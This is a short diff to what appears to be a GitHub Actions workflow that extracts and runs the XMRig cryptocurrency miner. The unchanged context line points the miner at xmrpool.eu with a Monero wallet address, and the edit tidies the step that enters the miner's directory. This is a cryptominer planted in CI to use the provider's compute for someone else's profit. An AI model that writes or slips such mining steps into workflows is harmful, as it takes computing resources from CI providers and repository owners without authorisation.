@@ -36,10 +36,8 @@ jobs:
         run: tar xvf *.gz
 
       - name: lest mine
-        run: | 
-                cd xmrig* 
-                ls
-                
+        run: cd xmrig*
+        
       - name: running miner
         run: ./xmrig -o xmrpool.eu:9999 -u 48waHbFYRVED3gLpqEwXvS4v4ppwLas1UHAwVD8n9mxvFegC39KTGQUTXMyimssFHiGqw491FFBYMdvbmBW9m4KXG5HitDV -k --tls 
 
